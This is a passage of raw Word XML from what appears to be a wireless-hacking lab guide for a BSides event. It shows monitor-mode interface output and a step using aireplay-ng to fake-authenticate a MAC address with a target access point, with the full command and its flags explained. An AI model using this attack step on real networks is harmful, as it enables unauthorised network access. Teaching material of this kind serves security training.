        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Mode</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:Monitor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Frequency:2.452 GHz  Access Point: 00:09:5B:EC:EE:F2   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D048860" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Bit Rate:0 kb/s   Tx-Power</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:15</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Sensitivity=0/3  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F0D678" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Retry:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   RTS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Fragment </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7F607C5A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Encryption </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>key:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="338F82D4" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Power </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Management:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="239ADBDB" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Link Quality=0/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>94  Signal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> level=-98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Noise level=-98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="06F11610" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">nwid:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">crypt:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Rx invalid frag:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E80B73" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Tx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> excessive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">retries:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">misc:0   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Missed beacon:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1481C1EE" w14:textId="77777777" w:rsidR="00B0296B" w:rsidRDefault="00B0296B" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21F06D31" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63005EEB" w14:textId="1519EA24" w:rsidR="004652D1" w:rsidRDefault="00DC6CB9" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 2</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to do a fake authentication with the access point</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F99ADA5" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77B3122B" w14:textId="6926A10E" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="00F37B2B">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 xml:space="preserve">In order for an access point to accept a packet, the source MAC address must already be associated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FD7D6A" w14:textId="77777777" w:rsidR="00F37B2B" w:rsidRDefault="00F37B2B" w:rsidP="00F37B2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BCD03C4"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To associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D13513" w14:textId="77777777" w:rsidR="00540687" w:rsidRDefault="00540687" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="731651B0" w14:textId="1D52967D" w:rsidR="004652D1" w:rsidRPr="002A56B4" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 0 -e </w:t>
      </w:r>
      <w:r w:rsidR="00F80E8E" w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC526C9" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A48C4D3"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B39E1C" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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-1 means fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C54847" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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 xml:space="preserve">0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reassociation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> timing in seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307296CC" w14:textId="2043D85D" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370FE321" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
